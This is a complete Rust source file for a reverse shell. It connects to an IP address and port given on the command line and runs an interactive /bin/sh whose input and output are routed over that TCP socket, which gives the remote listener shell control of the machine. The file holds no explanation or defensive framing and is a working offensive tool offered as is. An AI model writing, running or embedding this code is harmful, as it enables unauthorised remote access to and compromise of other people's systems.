use std::env;
use std::fs::File;
use std::net::TcpStream;
use std::os::unix::io::{FromRawFd, RawFd};
use std::os::unix::prelude::AsRawFd;
use std::process::Command;

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        panic!("Usage: reverse_shell <IP> <PORT>");
    }

    let ip = &args[1];
    let port = &args[2];

    let tcp_stream = match TcpStream::connect(format!("{ip}:{port}")) {
        Err(why) => panic!("Connection error: {why}"),
        Ok(tcp_stream) => tcp_stream,
    };

    let raw_fd: RawFd = tcp_stream.as_raw_fd();

    let mut rev_shell = match Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { File::from_raw_fd(raw_fd) })
        .stdout(unsafe { File::from_raw_fd(raw_fd) })
        .stderr(unsafe { File::from_raw_fd(raw_fd) })
        .spawn()
    {
        Err(why) => panic!("Error: {why}"),
        Ok(child) => child,
    };

    match rev_shell.wait() {
        Err(why) => panic!("Error: {why}"),
        Ok(exit_status) => exit_status,
    };
}
